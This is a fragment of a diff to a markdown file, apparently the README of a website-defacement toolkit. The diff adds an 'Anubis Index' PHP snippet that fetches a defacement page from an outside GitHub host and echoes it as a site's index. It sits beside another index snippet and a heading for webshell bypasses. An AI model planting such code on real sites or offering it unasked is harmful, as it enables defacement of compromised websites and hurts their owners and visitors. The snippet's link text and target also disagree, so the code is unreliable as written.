@@ -13,6 +13,14 @@
   echo $index;
 ?>
 ```
+##### Anubis Index
+```
+<?php
+  $index = file_get_contents("[https://raw.githubusercontent.com/iiMrDark/indexTeam/main/gaza-index](https://raw.githubusercontent.com/iiMrDark/indexTeam/main/anubisIndex)");
+  $lol = $index;
+  echo $lol;
+?>
+```
 
 #### ByPass | WebShell
 ```
